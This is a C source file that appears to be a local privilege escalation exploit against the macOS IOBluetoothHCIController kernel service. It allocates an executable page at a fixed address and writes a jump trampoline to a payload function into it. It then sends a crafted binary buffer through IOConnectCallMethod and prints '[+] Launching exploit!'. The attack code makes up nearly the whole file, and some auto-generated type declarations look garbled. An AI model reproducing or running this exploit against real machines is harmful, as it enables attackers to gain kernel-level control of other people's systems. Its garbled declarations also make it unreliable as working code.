
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int vm_address_t ;
typedef scalar_t__ uint64_t ;
typedef int uint32_t ;
typedef int mach_port_t ;
typedef scalar_t__ kern_return_t ;
typedef int io_service_t ;
typedef int io_connect_t ;
typedef int a ;


 scalar_t__ IOConnectCallMethod (int ,int ,int *,int ,void const*,int,int *,int *,int *,int *) ;
 int IOObjectRelease (int ) ;
 int IOServiceClose (int) ;
 int IOServiceGetMatchingService (int ,int ) ;
 int IOServiceMatching (char*) ;
 scalar_t__ IOServiceOpen (int ,int ,int ,int*) ;
 int VM_PROT_EXECUTE ;
 int VM_PROT_READ ;
 int VM_PROT_WRITE ;
 int kIOMasterPortDefault ;
 scalar_t__ kIOReturnSuccess ;
 int mach_task_self () ;
 int memset (void*,int ,int) ;
 scalar_t__ payload ;
 int printf (char*,...) ;
 int vm_allocate (int ,int*,int,int ) ;
 int vm_protect (int ,int,int,int ,int) ;

int main(void) {

  vm_address_t tgt = 0x0000048800000000;
  vm_allocate(mach_task_self(), &tgt, 0x1000, 0);
  vm_protect(mach_task_self(), tgt, 0x1000, 0,
      VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE);
  memset((void *)tgt, 0, 0x1000);


  char *target = (char *)tgt;


  target[7] = 0x48;
  target[8] = 0xb8;
  *((uint64_t *)(&target[9])) = (uint64_t) payload;


  target[17] = 0xff;
  target[18] = 0xe0;

  printf(" [+] Payload function  @ %016llx\n", (uint64_t) payload);
  printf(" [+] Stored trampoline @ %016llx\n", (uint64_t) tgt+7);


  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
    IOServiceMatching("IOBluetoothHCIController"));

  if (!service) {
    return -1;
  }


  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) {
    return kr;
  }

  printf(" [+] Opened connection to service on port: %d\n", port);



  char a[] = "\x00\x00\x00\x00\x00\x00\x00\x00"

    "\x00\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\x00\x11\x0a\x00\x00\x03\x72\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\xfa\x2a\x54\xff\x7f\x00\x00\x78\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xa8\xfb\x2a\x54\xff\x7f\x00\x00\xd8\xfa\x2a\x54\xff\x7f\x00\x00\x60\x4a\xb6\x86"
    "\x80\xff\xff\xff"



    "\xa8\xb6\xf5\xff\x80\xff\xff\xff";

  printf(" [+] Launching exploit!\n");
  kr = IOConnectCallMethod((mach_port_t) port,
                           (uint32_t) 0,
                           ((void*)0), 0,
                           (const void*) a,
                           sizeof(a),
                           ((void*)0), ((void*)0), ((void*)0), ((void*)0));



  return IOServiceClose(port);
}
